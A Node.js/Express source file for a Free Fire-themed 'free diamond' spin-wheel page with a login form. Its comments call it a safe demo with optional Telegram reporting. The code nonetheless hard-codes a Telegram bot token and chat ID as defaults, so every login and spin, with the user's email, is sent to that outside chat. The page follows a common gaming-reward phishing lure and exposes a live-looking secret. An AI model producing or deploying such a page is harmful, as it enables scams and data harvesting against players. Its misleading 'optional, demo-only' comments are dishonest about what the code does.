/**
 * FF-STYLE SPIN DEMO (Safe, demo-only)
 * - Single-file Node.js + Express app
 * - Animated spin wheel, neon UI
 * - Shows fake "diamond" prize (UI only) — DOES NOT grant real diamonds
 * - Optional: sends spin events to Telegram if TELEGRAM_BOT_TOKEN & TELEGRAM_CHAT_ID set
 *
 * Usage:
 * 1) save as server.js
 * 2) npm init -y
 * 3) npm install express axios body-parser
 * 4) (optional) export TELEGRAM_BOT_TOKEN="..." && export TELEGRAM_CHAT_ID="..."
 * 5) node server.js
 * 6) open http://localhost:3000
 *
 * Demo login: user@example.com / 12345
 *
 * IMPORTANT: This is a simulation/visual demo. Not affiliated with Garena or Free Fire.
 */

const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8259900549:AAGg38GusYI2J21elQAl54E0Ep8ogXlP7xQ";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "770690281";

// demo credential (only to allow viewing the spin UI)
const DEMO_USER = { email: "user@example.com", password: "12345", name: "DemoUser" };

// prize pool (fake)
const PRIZES = [
  { label: "10 💎", value: 10 },
  { label: "25 💎", value: 25 },
  { label: "50 💎", value: 50 },
  { label: "75 💎", value: 75 },
  { label: "100 💎", value: 100 },
  { label: "Try Again", value: 0 }
];

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// serve root login + UI (single page app style)
app.get("/", (req, res) => {
  res.send(`<!doctype html>
<html lang="si">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>FF Spin Demo — Free Diamond (Demo)</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
    :root{
      --bg:#07070b; --panel:#0f1220; --muted:#9aa4b2; --accent1:#ff5c7c; --accent2:#7c5cff;
      --neon: 0 0 30px rgba(124,92,255,0.18);
    }
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;background:radial-gradient(circle at 10% 10%, #0b0b12 0%, #020203 60%);color:#fff;font-family:Poppins,system-ui,Arial;display:flex;align-items:center;justify-content:center;padding:24px}
    .wrap{width:100%;max-width:1100px;display:grid;grid-template-columns:420px 1fr;gap:24px;align-items:start}
    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:14px;padding:20px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--neon)}
    .brand{display:flex;align-items:center;gap:12px}
    .logo{width:46px;height:46px;border-radius:10px;background:linear-gradient(135deg,var(--accent2),var(--accent1));display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;box-shadow:0 6px 20px rgba(124,92,255,0.2)}
    h1{margin:0;font-size:20px;color:#fff}
    p.lead{color:var(--muted);margin:8px 0 14px;font-size:13px}
    label{display:block;color:var(--muted);font-size:13px;margin-top:10px}
    input{width:100%;padding:10px;border-radius:8px;border:none;background:rgba(255,255,255,0.03);color:#fff;outline:none;margin-top:6px}
    button.primary{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,var(--accent2),var(--accent1));color:#fff;font-weight:700;cursor:pointer}
    .note{font-size:12px;color:#ffd6d6;margin-top:10px}
    .footer{font-size:12px;color:var(--muted);text-align:center;margin-top:12px}
    .stage{display:flex;align-items:center;justify-content:center;flex-direction:column;gap:18px}
    .wheel-wrap{width:460px;height:460px;display:flex;align-items:center;justify-content:center;position:relative}
    .wheel{
      width:380px;height:380px;border-radius:50%;position:relative;overflow:hidden;
      border:6px solid rgba(255,255,255,0.04);box-shadow:0 20px 60px rgba(0,0,0,0.6);
      background:conic-gradient(
        #ff5c7c 0 60deg,
        #ff9a5c 60deg 120deg,
        #ffd66b 120deg 180deg,
        #7c5cff 180deg 240deg,
        #4ea2ff 240deg 300deg,
        #ff8bd1 300deg 360deg
      );
      transition: transform 4s cubic-bezier(.2,.8,.2,1);
    }
    .wheel .seg{position:absolute;inset:0;display:grid;place-items:center;font-weight:700;color:#0b0b0b}
    .pointer{position:absolute;top:6px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:18px solid transparent;border-right:18px solid transparent;border-bottom:26px solid #fff;filter:drop-shadow(0 6px 20px rgba(124,92,255,0.25))}
    .center{position:absolute;width:120px;height:120px;border-radius:50%;background:linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.02));display:flex;align-items:center;justify-content:center;font-weight:700}
    .prize-label{font-size:18px;color:#fff;text-shadow:0 6px 24px rgba(124,92,255,0.15)}
    .info-row{display:flex;gap:12px;flex-wrap:wrap;justify-content:center}
    .mini{background:rgba(255,255,255,0.02);padding:10px 12px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);font-size:13px;color:var(--muted)}
    .modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);visibility:hidden;opacity:0;transition:opacity .2s}
    .modal.show{visibility:visible;opacity:1}
    .modal .box{background:linear-gradient(180deg,#091022,#0f1224);padding:20px;border-radius:12px;border:1px solid rgba(255,255,255,0.04);text-align:center;max-width:360px}
    .result-big{font-size:34px;font-weight:800;color:#ffd66b;margin-top:6px}
    .close-btn{margin-top:12px;padding:10px 14px;border-radius:8px;border:none;background:#7c5cff;color:#fff;font-weight:700;cursor:pointer}
    @media (max-width:980px){.wrap{grid-template-columns:1fr;}.wheel-wrap{width:320px;height:320px}.wheel{width:280px;height:280px}.center{width:96px;height:96px}}
  </style>
</head>
<body>
  <div class="wrap">
    <!-- left: login / info -->
    <div class="card">
      <div class="brand">
        <div class="logo">FF</div>
        <div>
          <h1>FF Spin Demo</h1>
          <p class="lead">Free Diamond Simulator — demo only (not affiliated with Garena).</p>
        </div>
      </div>

      <form id="loginForm">
        <label>Email</label>
        <input id="email" type="email" placeholder="user@example.com" required value="user@example.com">
        <label>Password</label>
        <input id="password" type="password" placeholder="12345" required value="12345">
        <button class="primary" type="submit">Login & Open Spin</button>
      </form>

      <p class="note">Demo credentials: <strong>user@example.com / 12345</strong></p>
      <p class="footer">This is a visual demo only — it does NOT provide real diamonds.</p>
    </div>

    <!-- right: wheel -->
    <div class="card stage" id="spinStage" style="display:none">
      <div style="width:100%;display:flex;justify-content:space-between;align-items:center">
        <div class="mini">User: <span id="uemail" style="color:#fff"></span></div>
        <div class="mini">Demo Mode</div>
      </div>

      <div class="wheel-wrap" style="margin-top:12px">
        <div class="pointer"></div>
        <div id="wheel" class="wheel" style="transform:rotate(0deg)"></div>
        <div class="center">
          <div style="text-align:center">
            <div style="font-size:12px;color:var(--muted)">SPIN</div>
            <div class="prize-label">FF DIAMOND</div>
          </div>
        </div>
      </div>

      <div class="info-row" style="margin-top:10px">
        <div class="mini">Prizes: 10 / 25 / 50 / 75 / 100</div>
        <div class="mini">Cooldown: demo only</div>
      </div>

      <div style="margin-top:16px;display:flex;gap:10px;justify-content:center">
        <button id="spinBtn" class="primary" style="width:200px">Spin Now</button>
      </div>
      <div style="margin-top:12px;text-align:center;color:var(--muted);font-size:13px">Results are randomized for demo.</div>
    </div>
  </div>

  <!-- modal -->
  <div id="modal" class="modal">
    <div class="box">
      <div id="resultText">You won</div>
      <div id="bigPrize" class="result-big">0 💎</div>
      <button id="closeBtn" class="close-btn">Close</button>
    </div>
  </div>

  <script>
    const PRIZES = ${JSON.stringify(PRIZES)};
    const wheel = document.getElementById('wheel');
    const spinStage = document.getElementById('spinStage');
    const spinBtn = document.getElementById('spinBtn');
    const modal = document.getElementById('modal');
    const bigPrize = document.getElementById('bigPrize');
    const resultText = document.getElementById('resultText');
    const closeBtn = document.getElementById('closeBtn');
    const uemail = document.getElementById('uemail');

    function buildWheel(){
      const segCount = PRIZES.length;
      const segAngle = 360 / segCount;
      wheel.innerHTML = '';
      for(let i=0;i<segCount;i++){
        const seg = document.createElement('div');
        seg.className = 'seg';
        seg.style.transform = 'rotate(' + (i*segAngle) + 'deg)';
        seg.innerHTML = '<div style="transform:rotate(' + (segAngle/2) + 'deg);font-weight:800;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,0.6)">' + PRIZES[i].label + '</div>';
        wheel.appendChild(seg);
      }
    }
    buildWheel();

    document.getElementById('loginForm').addEventListener('submit', async (e)=>{
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      try {
        const res = await fetch('/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password})});
        const data = await res.json();
        if(data.success){
          spinStage.style.display = 'flex';
          document.getElementById('loginForm').style.display = 'none';
          uemail.textContent = email;
        } else alert(data.message || 'Invalid credentials');
      } catch (err) { alert('Server error'); console.error(err); }
    });

    let spinning = false;
    spinBtn.addEventListener('click', async ()=>{
      if(spinning) return;
      spinning = true;
      spinBtn.textContent = 'Spinning...';
      spinBtn.disabled = true;

      const idx = Math.floor(Math.random() * PRIZES.length);
      const segCount = PRIZES.length;
      const segAngle = 360 / segCount;
      const extra = 3 + Math.floor(Math.random()*3);
      const targetDeg = 360*extra + (360 - (idx * segAngle) - segAngle/2);
      wheel.style.transition = 'transform 4s cubic-bezier(.18,.9,.18,1)';
      wheel.style.transform = 'rotate(' + targetDeg + 'deg)';

      setTimeout(async ()=>{
        const prize = PRIZES[idx];
        bigPrize.textContent = prize.label;
        resultText.textContent = prize.value > 0 ? 'Congratulations!' : 'Try Again!';
        modal.classList.add('show');
        try {
          const email = document.getElementById('email').value.trim();
          await fetch('/spin', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,prize:prize})});
        } catch(err){ console.error('spin log failed', err) }
        spinBtn.textContent = 'Spin Now';
        spinBtn.disabled = false;
        spinning = false;
      }, 4200);
    });

    closeBtn.addEventListener('click', ()=> modal.classList.remove('show'));
  </script>
</body>
</html>`);
});

// demo login endpoint
app.post("/login", (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) return res.json({ success:false, message: "Email & password required" });
  if (email === DEMO_USER.email && password === DEMO_USER.password) {
    (async ()=>{
      try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: TELEGRAM_CHAT_ID,
          text: `🔔 Demo login\nEmail: ${email}\nTime: ${new Date().toLocaleString()}`
        });
      } catch(err){ console.error('telegram login error', err.message || err) }
    })();
    return res.json({ success:true });
  }
  return res.json({ success:false, message: "Invalid demo credentials" });
});

// spin logging endpoint
app.post("/spin", async (req, res) => {
  const { email, prize } = req.body || {};
  if (!email || !prize) return res.json({ success:false, message: "Missing data" });

  const text = `🎰 FF Spin Demo Result\nUser: ${email}\nPrize: ${prize.label}\nTime: ${new Date().toLocaleString()}\nNote: demo only`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text
    });
  } catch (err) {
    console.error('telegram spin error', err.message || err);
  }

  return res.json({ success:true });
});

app.listen(PORT, () => {
  console.log(`🚀 FF Spin Demo running on http://localhost:${PORT}`);
});
